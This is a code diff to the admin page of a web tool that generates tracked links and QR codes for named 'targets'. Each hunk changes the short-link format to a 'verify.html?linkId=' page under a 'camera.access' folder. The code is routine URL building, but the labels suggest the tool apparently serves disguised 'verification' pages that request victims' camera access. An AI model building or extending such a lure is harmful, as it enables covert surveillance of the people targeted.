@@ -626,7 +626,7 @@
                         <button class="btn btn-primary" id="createBtn">⚡ Generate Link</button>
                     </div>
                     <div class="form-row" style="margin-bottom:0;">
-                        <label class="check-label"><input type="checkbox" id="useShortLink" checked> 🔗 Use Short Professional Link <span style="font-size:11px;color:var(--muted);margin-left:4px;">(Copy &amp; QR will share <b>shahidbashirharoo.github.io/verify/{id}</b>)</span></label>
+                        <label class="check-label"><input type="checkbox" id="useShortLink" checked> 🔗 Use Short Professional Link <span style="font-size:11px;color:var(--muted);margin-left:4px;">(Copy &amp; QR will share <b>.../camera.access/verify.html?linkId={id}</b>)</span></label>
                     </div>
                 </div>
                 <div class="section">
@@ -871,7 +871,7 @@
                         <button class="btn btn-primary" id="uCreateBtn">⚡ Generate Link</button>
                     </div>
                     <div class="form-row" style="margin-bottom:0;">
-                        <label class="check-label"><input type="checkbox" id="uUseShortLink" checked> 🔗 Use Short Professional Link <span style="font-size:11px;color:var(--muted);margin-left:4px;">(Copy &amp; QR will share <b>shahidbashirharoo.github.io/verify/{id}</b>)</span></label>
+                        <label class="check-label"><input type="checkbox" id="uUseShortLink" checked> 🔗 Use Short Professional Link <span style="font-size:11px;color:var(--muted);margin-left:4px;">(Copy &amp; QR will share <b>.../camera.access/verify.html?linkId={id}</b>)</span></label>
                     </div>
                 </div>
                 <div class="section">
@@ -1273,7 +1273,7 @@ function renderLinksTable() {
         const row = document.createElement('tr');
 
         const verHref   = window.location.origin + window.location.pathname.replace('admin.html','index.html') + '?linkId=' + id;
-        const shortHref = window.location.origin + '/verify/' + id;
+        const shortHref = window.location.origin + window.location.pathname.replace('admin.html','verify.html') + '?linkId=' + id;
         // Target Name column — always shows the actual target name
         const nameCell = `<td><a href="${verHref}" target="_blank" rel="noopener" title="Verification link: ${verHref}" style="color:var(--primary);font-weight:700;text-decoration:none;">${esc(l.name || 'Unnamed')}</a></td>`;
         // Display URL column — shows displayUrl or '—'
@@ -1312,7 +1312,7 @@ document.getElementById('linkTableBody').addEventListener('click', e => {
         const base     = window.location.origin + window.location.pathname.replace('admin.html','index.html');
         const useShort = document.getElementById('useShortLink')?.checked;
         const url      = useShort
-            ? window.location.origin + '/verify/' + id
+            ? window.location.origin + window.location.pathname.replace('admin.html','verify.html') + '?linkId=' + id
             : base + '?linkId=' + id;
         navigator.clipboard.writeText(url)
             .then(() => toast('✅ Link copied!' + (useShort ? ' (short)' : '')))
@@ -1321,7 +1321,7 @@ document.getElementById('linkTableBody').addEventListener('click', e => {
         const base     = window.location.origin + window.location.pathname.replace('admin.html','index.html');
         const useShort = document.getElementById('useShortLink')?.checked;
         const url      = useShort
-            ? window.location.origin + '/verify/' + id
+            ? window.location.origin + window.location.pathname.replace('admin.html','verify.html') + '?linkId=' + id
             : base + '?linkId=' + id;
         showQR(url);
     } else if (action === 'toggle') {
@@ -2233,7 +2233,7 @@ function renderUserLinksTable() {
         count++;
         const row = document.createElement('tr');
         const verHref   = window.location.origin + window.location.pathname.replace('admin.html','index.html') + '?linkId=' + id;
-        const shortHref = window.location.origin + '/verify/' + id;
+        const shortHref = window.location.origin + window.location.pathname.replace('admin.html','verify.html') + '?linkId=' + id;
         // Target Name — always shows actual target name
         const nameCell    = `<td><a href="${verHref}" target="_blank" rel="noopener" title="Verification link: ${verHref}" style="color:var(--primary);font-weight:700;text-decoration:none;">${esc(l.name || 'Unnamed')}</a></td>`;
         // Display URL — shows displayUrl or '—'
@@ -2272,14 +2272,14 @@ document.getElementById('uLinkTableBody').addEventListener('click', e => {
         const base     = window.location.origin + window.location.pathname.replace('admin.html','index.html');
         const useShort = document.getElementById('uUseShortLink')?.checked;
         const url      = useShort
-            ? window.location.origin + '/verify/' + id
+            ? window.location.origin + window.location.pathname.replace('admin.html','verify.html') + '?linkId=' + id
             : base + '?linkId=' + id;
         navigator.clipboard.writeText(url).then(() => toast('✅ Link copied!' + (useShort ? ' (short)' : ''))).catch(() => prompt('Copy:', url));
     } else if (uaction === 'qr') {
         const base     = window.location.origin + window.location.pathname.replace('admin.html','index.html');
         const useShort = document.getElementById('uUseShortLink')?.checked;
         const url      = useShort
-            ? window.location.origin + '/verify/' + id
+            ? window.location.origin + window.location.pathname.replace('admin.html','verify.html') + '?linkId=' + id
             : base + '?linkId=' + id;
         showQR(url);
     } else if (uaction === 'toggle') {
